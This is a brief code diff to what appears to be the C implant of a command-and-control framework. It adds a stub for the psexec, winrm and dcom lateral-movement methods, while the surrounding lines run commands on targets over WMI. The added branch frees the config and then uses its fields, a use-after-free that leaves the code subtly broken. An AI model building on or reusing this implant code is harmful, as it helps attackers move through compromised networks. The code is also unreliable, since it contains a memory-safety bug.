@@ -37,6 +37,10 @@ int erebus_mod_lateral_move(const uint8_t *config, size_t config_len, uint8_t **
         success = erebus_mod_run_cmd(cmd, &so, &se, &code) && code == 0;
         if (so) { strncpy(output, so, sizeof(output) - 1); free(so); }
         if (se) free(se);
+    } else if (strcmp(cfg.method, "psexec") == 0 || strcmp(cfg.method, "winrm") == 0 || strcmp(cfg.method, "dcom") == 0) {
+        snprintf(output, sizeof(output), "%s not yet implemented in C implant; use wmi method", cfg.method);
+        erebus_pb_free_lateral_config(&cfg);
+        return erebus_pb_encode_lateral_result(cfg.method, cfg.target, 0, output, out, out_len);
     } else {
         erebus_pb_free_lateral_config(&cfg);
         return 0;
